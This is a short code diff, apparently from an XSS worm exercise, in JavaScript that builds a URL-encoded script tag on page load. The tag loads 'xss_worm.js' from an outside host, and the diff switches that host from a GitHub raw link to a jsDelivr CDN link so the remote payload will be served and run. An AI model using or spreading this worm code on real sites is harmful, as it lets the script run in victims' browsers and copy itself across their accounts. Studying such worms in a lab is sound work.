@@ -1,7 +1,7 @@
 window.onload = function () {
     var wormCode = encodeURIComponent(
         '<script type="text/javascript"' +
-        'src="https://raw.githubusercontent.com/airanatividad/storage/refs/heads/main/xss_worm.js">' +
+        'src="https://cdn.jsdelivr.net/gh/airanatividad/storage@main/xss_worm.js">' +
         "</" +
         "script>"
     );
